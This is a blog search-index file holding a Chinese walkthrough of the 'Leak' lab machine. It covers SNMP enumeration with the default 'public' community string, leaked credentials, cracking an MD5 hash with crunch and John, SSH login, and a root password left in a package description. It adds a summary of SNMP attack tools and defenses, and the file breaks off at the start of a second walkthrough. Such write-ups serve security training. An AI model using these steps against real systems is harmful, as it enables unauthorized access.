<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Leak</title>
    <link href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Leak/"/>
    <url>/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Leak/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24                                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00067s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00045s latency).<br>MAC Address: 08:00:27:1A:06:78 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.00046s latency).<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.23 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.42</code></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.42                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.00018s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.48 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.42<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.42<br>Host is up (0.013s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Kali Linux - \xE5\xAE\x89\xE5\x85\xA8\xE6\xB8\x97\xE9\x80\x8F\xE6\xB5\x8B\xE8\xAF\x95\xE5\xB9\xB3\xE5\x8F\xB0<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.37 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sU --top-ports 20 192.168.2.42<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 19:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> sunset.leak.dsz (192.168.2.42)<br>Host is up (0.00075s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   open          snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.18 seconds<br></code></pre></td></tr></table></figure><p>发现开放端口：<code>161，SNMP服务</code></p><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507011030718.png"></p><h3 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.42 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.42<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 15740]<br>/.php                 (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>=============================================================== <br></code></pre></td></tr></table></figure><p>没有发现其他的目录，基本上没有啥东西</p><h2 id="2、161端口"><a href="#2、161端口" class="headerlink" title="2、161端口"></a>2、161端口</h2><h3 id="1、SNMP信息泄露"><a href="#1、SNMP信息泄露" class="headerlink" title="1、SNMP信息泄露"></a>1、SNMP信息泄露</h3><p>由于161端口的服务是<code>snmp</code>，SNMP 服务常因配置不当而泄露大量敏感信息。<br>直接使用工具<code>snmapwalk</code>获取信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# snmpwalk -v 2c -c public 192.168.2.42 &gt; 1.txt  <br></code></pre></td></tr></table></figure><p>在文件里面找到一个服务<code>leak-service</code>的用户名和密码：<code>Shinozaki：ShinozakiAi</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012002678.png"></p><p>没找到利用的思路，后来去问了群主，说里面有一个<code>域名</code>，那找了一下，比较像域名的也只有<code>admin@sunset.leak.dsz</code>，由于域名不能<code>@</code> ，所以域名可能是 <code>sunset.leak.dsz</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012003777.png"></p><p>追加到<code>hosts</code>文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.42 sunset.leak.dsz&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><p>访问<code>sunset.leak.dsz</code>，发现还是一样的界面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012007965.png"></p><h3 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2-目录扫描"></a>2-目录扫描</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──(root㉿kali)-[/tmp]<br><span class="hljs-section">└─# gobuster dir -u http://sunset.leak.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:                     http://sunset.leak.dsz<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 280]<br>/.html                (Status: 403) [Size: 280]<br>/index.html           (Status: 200) [Size: 15740]<br>/manager              (Status: 301) [Size: 320] [--&gt; http://sunset.leak.dsz/manager/]<br>/.html                (Status: 403) [Size: 280]<br>/.php                 (Status: 403) [Size: 280]<br>/server-status        (Status: 403) [Size: 280]<br><span class="hljs-section">Progress: 1102800 / 1102805 (100.00%)</span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">Finished</span><br><span class="hljs-section">===============================================================</span><br></code></pre></td></tr></table></figure><p>发现存在一个目录<code>manager</code></p><p>尝试进行访问，发现需要账号和密码，使用在<code>snmp</code>里面发现的账号密码<code>Shinozaki：ShinozakiAi</code>进行登录，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012012760.png"><br>发现已经提示我们利用的步骤了，照着来就好了</p><h3 id="3-John爆破"><a href="#3-John爆破" class="headerlink" title="3-John爆破"></a>3-John爆破</h3><p>使用 <code>crunch</code> 生成一个以 <code>baba</code> 开头的8位字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# crunch 8 8 -t baba@@@@ -o wordlist.txt <br>Crunch will now generate the following amount of data: 4112784 bytes<br>3 MB<br>0 GB<br>0 TB<br>0 PB<br>Crunch will now generate the following number of lines: 456976 <br><br>crunch: 100% completed generating output<br></code></pre></td></tr></table></figure><p>使用<code>John</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;d21715210cb6224f9ff4c075a8906fe9&quot;</span> &gt; hashes.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# john --format=raw-md5 --wordlist=wordlist.txt hashes.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (Raw-MD5 [MD5 128/128 AVX 4x3])<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=8<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>babadawo         (?)     <br>1g 0:00:00:00 DONE (2025-07-01 19:33) 100.0g/s 5337Kp/s 5337Kc/s 5337KC/s babadaro..babadayx<br>Use the <span class="hljs-string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>找到密码<code>babadawo</code></p><p>直接使用用户名和密码进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh ai@192.168.2.42          <br>ai@192.168.2.42<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Leak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">ai@Leak:~$ id</span><br><span class="hljs-string">uid=1000(ai) gid=1000(ai) groups=1000(ai)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-13421fec-559d-11f0-a1af-5f1558743b4d&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code>，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">sudo</span> -l<br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> ai: <br></code></pre></td></tr></table></figure><p>查看<code>/</code>目录下面，发现存在<code>.bash_history</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">cat</span> .bash_history <br>leak-date<br></code></pre></td></tr></table></figure><h2 id="1、查看系统的软件包"><a href="#1、查看系统的软件包" class="headerlink" title="1、查看系统的软件包"></a>1、查看系统的软件包</h2><p>查看当前系统上安装的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ dpkg -l | grep leak<br>ii  leak-date                     1.0-1                                       amd64        Simple <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span> display utility<br>ii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)<br></code></pre></td></tr></table></figure><p>发现一个软件包和<code>.bash_history</code>里面的一样，查看详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ dpkg -s leak-date<br>Package: leak-date<br>Status: install ok installed<br>Priority: optional<br>Section: utils<br>Installed-Size: 500<br>Maintainer: Security Admin &lt;admin@leak.dsz&gt;<br>Architecture: amd64<br>Version: 1.0-1<br>Description: Simple <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span> display utility<br> This package provides a minimal CLI utility to display<br> the current system <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span>. Ideal <span class="hljs-keyword">for</span> scripts and<br> system monitoring. SECURITY NOTICE: System debug token<br> IMKCFRunLoopWakeUpReliable <span class="hljs-keyword">for</span> root access.<br></code></pre></td></tr></table></figure><p>发现最后一条提示<code>IMKCFRunLoopWakeUpReliable for root access</code>，这串字符<code>IMKCFRunLoopWakeUpReliable</code>用作<code>root</code>的访问</p><p>直接访问<code>root</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ su root<br>Password: <br>root@Leak:/home/ai# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Leak:/home/ai# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-357d3d08-5598-11f0-a27e-639fd7e7110b&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、SNMP渗透"><a href="#1、SNMP渗透" class="headerlink" title="1、SNMP渗透"></a>1、SNMP渗透</h2><h3 id="1-SNMP渗透的常见方式"><a href="#1-SNMP渗透的常见方式" class="headerlink" title="1-SNMP渗透的常见方式"></a>1-<strong>SNMP渗透的常见方式</strong></h3><ul><li><strong>利用默认社区字符串</strong>：许多设备默认有两个社区字符串“public”（只读）和“private”（读写）。攻击者可尝试使用这些默认字符串来获取设备信息，如设备型号、配置文件等。</li><li><strong>暴力破解社区字符串</strong>：通过编写脚本或使用工具，对设备的SNMP社区字符串进行暴力破解，一旦破解成功，攻击者就可能获得设备的管理权限。</li><li><strong>利用SNMP漏洞</strong>：某些设备的SNMP实现存在漏洞，如缓冲区溢出、命令注入等。攻击者可利用这些漏洞，向设备发送恶意请求，从而控制设备或获取敏感信息。</li><li><strong>信息收集与利用</strong>：通过SNMP获取设备的系统信息、接口信息、路由表等，分析这些信息以发现网络中的薄弱环节，为进一步的攻击做准备。例如，获取设备的IP地址、MAC地址、端口状态等信息，可帮助攻击者了解网络拓扑结构。</li></ul><h3 id="2-SNMP渗透的工具"><a href="#2-SNMP渗透的工具" class="headerlink" title="2-SNMP渗透的工具"></a>2-<strong>SNMP渗透的工具</strong></h3><ul><li><strong>snmpget</strong>：用于获取单个SNMP对象的值。例如，<code>snmpget -v2c -c public 10.10.11.48 1.3.6.1.2.1.1.1.0</code>可以查询设备的系统描述。</li><li><strong>snmpwalk</strong>：用于获取一系列SNMP对象的值。例如，<code>snmpwalk -v2c -c public 10.10.11.48 1.3.6.1.2.1.1</code>可以获取设备的系统信息。</li><li><strong>snmp-check</strong>：用于检查目标设备的SNMP信息，如系统信息、接口信息等。例如，<code>snmp-check -c public 10.10.11.48</code>可以检查目标设备的SNMP信息。</li><li><strong>cisc0wn</strong>：针对开启了SNMP协议的Cisco路由器和交换机的攻击脚本，可暴力猜解community string、下载配置文件以及破解密码。</li><li><strong>h3c-pt-tools</strong>：可针对华为、HP、H3C的设备进行渗透测试和审计，可使用其中的nmap脚本和msf模块进行SNMP自动化攻击。</li></ul><h3 id="3-防御SNMP渗透的措施"><a href="#3-防御SNMP渗透的措施" class="headerlink" title="3-防御SNMP渗透的措施"></a>3-<strong>防御SNMP渗透的措施</strong></h3><ul><li><strong>更改默认社区字符串</strong>：将设备的默认社区字符串修改为复杂且唯一的字符串，避免使用默认的“public”和“private”。</li><li><strong>限制访问</strong>：通过防火墙或访问控制列表（ACL），限制对SNMP端口（UDP 161&#x2F;162）的访问，只允许特定的IP地址或网络段访问。</li><li><strong>启用认证和加密</strong>：对于支持SNMP v3的设备，启用认证和加密功能，以确保SNMP通信的安全性。</li><li><strong>定期审计和监控</strong>：定期对网络设备的SNMP配置进行审计，检查是否存在安全漏洞。同时，使用监控工具对SNMP流量进行实时监控，及时发现异常行为。</li></ul><p>【参考】</p><ul><li><a href="https://mp.weixin.qq.com/s/b6v0hW5_rBKN5YgXKK2dvw">https://mp.weixin.qq.com/s/b6v0hW5_rBKN5YgXKK2dvw</a></li><li><a href="https://mp.weixin.qq.com/s/VGVBlgrzoSDgOZkESTS66A">https://mp.weixin.qq.com/s/VGVBlgrzoSDgOZkESTS66A</a></li><li><a href="https://mp.weixin.qq.com/s/cceDMM4dJbC_IpexrMO8jg">https://mp.weixin.qq.com/s/cceDMM4dJbC_IpexrMO8jg</a></li><li><a href="https://mp.weixin.qq.com/s/5_TbDNzyw_b9HEI5Z6-ZNw">https://mp.weixin.qq.com/s/5_TbDNzyw_b9HEI5Z6-ZNw</a></li><li><a href="https://mp.weixin.qq.com/s/u3rqd7cFPMGKoRaZInJIQw">https://mp.weixin.qq.com/s/u3rqd7cFPMGKoRaZInJIQw</a></li><li><a href="https://mp.weixin.qq.com/s/1pnI03pluIGGeYsg3EWBDw">https://mp.weixin.qq.com/s/1pnI03pluIGGeYsg3EWBDw</a></li></ul><h2 id="2、提权-软件包"><a href="#2、提权-软件包" class="headerlink" title="2、提权-软件包"></a>2、提权-软件包</h2><ul><li>查看当前系统的软件包：<code>dpkg -l</code></li><li>查看软件包信息：<code>dpkg -s &lt;deb_name&gt;</code></li><li>验证软件包的完整性：<code>dpkg -V</code><br> <a href="https://www.cnblogs.com/xzongblogs/p/15535087.html">Linux Ubuntu dpkg 命令详解 - 五月的麦田 - 博客园</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内部靶机/Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>snmp服务</tag>
      
      <tag>提取-dpkg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Honeypot</title>
    <link href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Honeypot/"/>
    <url>/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Honeypot/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00028s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:D8:AE:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00044s latency).<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>IP地址为：<code>192.168.2.41</code></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 